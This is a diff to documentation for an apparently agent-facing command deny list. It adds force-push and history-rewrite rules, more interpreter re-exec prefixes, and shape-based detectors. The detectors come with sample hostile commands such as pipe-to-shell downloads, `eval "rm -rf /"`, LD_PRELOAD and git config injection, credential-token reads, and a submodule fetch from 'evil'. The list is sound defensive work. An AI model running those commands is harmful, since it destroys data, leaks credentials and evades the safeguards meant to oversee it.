@@ -43,14 +43,34 @@ autonomous mode.
 | `git add -a` | Stages all files indiscriminately |
 | `git branch -D` | Force-deletes a branch (data loss risk) |
 
+### Force-push and history rewrite (`git-deny`)
+
+| Prefix | Reason |
+|---|---|
+| `git push --force` | Force-rewrites remote history |
+| `git push -f` | Short form of `--force` |
+| `git push --force-with-lease` | Force-rewrites remote history (lease-checked, but still destructive) |
+| `git push --force-if-includes` | Force-rewrites remote history |
+| `git push --mirror` | Mirrors local refs to remote, deleting any remote-only refs |
+| `git push <remote> +<refspec>` | Refspec form of force-push (synthetic-deny matcher) |
+| `git filter-branch` / `git filter-repo` | Rewrites history |
+| `git reflog expire` / `git reflog delete` | Drops recovery points |
+| `git gc --prune=now` | Permanently removes unreachable objects |
+
 ### Interpreter re-exec (`interpreter-deny`)
 
 | Prefix | Reason |
 |---|---|
-| `python -c` | Re-execs arbitrary code |
-| `python3 -c` | Re-execs arbitrary code |
-| `node -e` | Re-execs arbitrary code |
-| `node --eval` | Re-execs arbitrary code |
+| `python -c` / `python3 -c` / `python3.X -c` | Re-execs arbitrary code |
+| `node -e` / `node --eval` | Re-execs arbitrary code |
+| `nodejs -e` | Re-execs arbitrary code |
+| `pypy -c` / `pypy3 -c` | Re-execs arbitrary code |
+| `bun -e` / `bun --eval` | Re-execs arbitrary code |
+| `deno eval` | Re-execs arbitrary code |
+
+Coverage extends to absolute paths (`/usr/bin/python3 -c`), version
+suffixes (`python3.11 -c`), and runner wrappers (`uvx python -c`,
+`pipx run python -c`).
 
 ### Environment-clearing wrappers (`env-deny`)
 
@@ -63,6 +83,24 @@ autonomous mode.
 | Prefix | Reason |
 |---|---|
 | `terraform destroy` | Destroys infrastructure |
+
+## Synthetic-deny patterns
+
+These deny on shape, not on a literal registry prefix. A reviewer auditing
+`ALWAYS_DENY` alone would miss them.
+
+| Pattern | Detector | Example denial |
+|---|---|---|
+| Shell-wrapper invocation | `_is_shell_wrapper` | `bash -c '...'`, `sh -lc '...'`, `sudo bash -c '...'`, `script /dev/null -c '...'` |
+| `eval` / `source` / `.` builtins | `_is_eval_builtin` | `eval "rm -rf /"`, `source /tmp/x`, `. /tmp/x` |
+| Dangerous env-var sinks | `_has_dangerous_env_sink` | `GIT_SSH_COMMAND=... git fetch`, `LD_PRELOAD=... cmd`, `DYLD_INSERT_LIBRARIES=... cmd`, `PYTHONPATH=... python` (23 keys total) |
+| `git -c` config injection | `_is_git_config_injection` | `git -c alias.x='!cmd'`, `git -c core.pager='!rm'`, `git -c core.hooksPath=...`, `git -c core.attributesFile=...` (14 sink keys + 5 glob patterns) |
+| Wrapper-stacking depth > 3 | `_count_wrapper_depth` | `sudo env -i bash -c 'cmd'` (depth 4) |
+| Pipe-to-shell | `_is_pipe_to_shell` | `curl http://x \| bash`, `wget -O- ... \| sh` |
+| Credential leak | `CREDENTIAL_LEAK_PATTERNS` | `gh auth token`, `aws iam create-access-key`, `aws sts get-session-token`, `op read` |
+| Force-push refspec | `_is_git_force_refspec` | `git push origin +HEAD:main`, `git push origin +refs/heads/main:refs/heads/main` |
+| `git submodule add` | `_is_git_submodule_add` | `git submodule add https://evil/pkg` (fetches arbitrary repo) |
+| `git worktree add <system-path>` | `_is_git_worktree_add_system` | `git worktree add /etc/passwd HEAD`, `git worktree add -b branch /usr/local/wt HEAD` |
 
 ## Classifier-routed prefixes
 
